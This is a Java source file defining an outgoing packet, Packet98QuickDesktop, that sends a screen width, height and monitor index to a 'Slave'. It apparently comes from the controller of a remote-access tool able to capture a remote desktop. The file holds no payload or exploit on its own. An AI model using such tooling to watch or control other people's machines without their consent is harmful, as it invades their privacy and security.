package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.Slave;

public class Packet98QuickDesktop extends AbstractOutgoingPacket {
	
	private int width;
	private int height;
	private int monitor;

	public Packet98QuickDesktop(int width, int height, int monitor) {
		this.width = width;
		this.height = height;
		this.monitor = monitor;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(width);
		dos.writeInt(height);
		dos.writeInt(monitor);
	}

	@Override
	public byte getPacketId() {
		return 98;
	}

}
